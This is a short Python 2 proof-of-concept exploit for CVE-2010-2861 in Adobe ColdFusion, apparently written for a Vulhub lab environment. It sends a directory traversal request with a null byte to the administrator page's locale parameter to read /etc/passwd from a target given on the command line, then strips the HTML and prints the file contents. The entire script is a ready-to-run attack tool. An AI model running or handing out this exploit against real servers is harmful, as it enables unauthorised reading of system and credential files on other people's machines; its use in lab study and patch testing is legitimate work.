#!/usr/bin/env python
#-*- coding:utf-8 -*-
#https://vulhub.org/#/environments/coldfusion/CVE-2010-2861/ 漏洞地址 


import re
import sys
import requests
from HTMLParser import HTMLParser
from htmlentitydefs import name2codepoint
reload(sys)
sys.setdefaultencoding('utf-8')


def POC(attack_url):
    attack_req = requests.get(url=attack_url+"/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../etc/passwd%00en")

    rar = attack_req.content.decode('gb2312')
    
    re_cdata=re.compile('//<!\[CDATA\[[^>]*//\]\]>',re.I)
    re_script=re.compile('<\s*script[^>]*>[^<]*<\s*/\s*script\s*>',re.I)
    re_style=re.compile('<\s*style[^>]*>[^<]*<\s*/\s*style\s*>',re.I)
    re_br=re.compile('<br\s*?/?>')
    re_h=re.compile('</?\w+[^>]*>')
    re_comment=re.compile('<!--[^>]*-->')
    s=re_cdata.sub('',rar )
    s=re_script.sub('',s)
    s=re_style.sub('',s)
    s=re_br.sub('\n',s)
    blank_line=re.compile('\n+')
    s = blank_line.sub('\n',s)
    s=re_h.sub('',s)
    s=re_comment.sub('',s)
    blank_line=re.compile('\n+')
    s=blank_line.sub('\n',s)
    print(s)



def main():

    args = sys.argv

    if len(args) == 2:
        url = args[1]

        POC(url)
    
    else:
            print "输入要测试的域名或ip：python http://www.xxxx.com"
           
            exit(0)   
    
if __name__ == '__main__':

    main()   